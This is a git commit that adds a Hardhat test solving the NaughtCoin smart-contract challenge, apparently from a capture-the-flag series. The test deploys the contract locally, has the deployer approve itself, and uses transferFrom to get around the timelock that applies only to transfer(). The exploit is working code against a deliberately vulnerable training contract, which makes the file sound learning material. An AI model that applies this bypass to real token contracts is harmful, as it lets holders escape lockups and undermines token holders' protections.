7fb87d64c006b30c7d38933fd9cb662c0327af24
grzeznx2 <grzeznx2@gmail.com>
2023-01-06 19:03:27 +0100

    Solve NaughtCoin challenge

---
+++ test/NaughCoin.spec.ts
@@ -0,0 +1,25 @@
+import { expect } from "chai";
+import { ethers } from "hardhat";
+
+const {BigNumber} = ethers
+
+describe("NaughtCoin", () => {
+  it("Solves the challenge", async () => {
+    const [deployer, receiver] = await ethers.getSigners()
+    const contractFactory = await ethers.getContractFactory("NaughtCoin")
+    const contract = await contractFactory.connect(deployer).deploy(deployer.address)
+    await contract.deployed()
+
+    const deployerBalance = await contract.balanceOf(deployer.address)
+
+    const approveTx = await contract.connect(deployer).approve(deployer.address, deployerBalance)
+    await approveTx.wait()
+
+
+    const tx = await contract.connect(deployer).transferFrom(deployer.address, receiver.address, deployerBalance)
+    await tx.wait()
+
+    expect(await contract.balanceOf(deployer.address)).to.eq(new BigNumber.from('0'))
+
+  });
+});
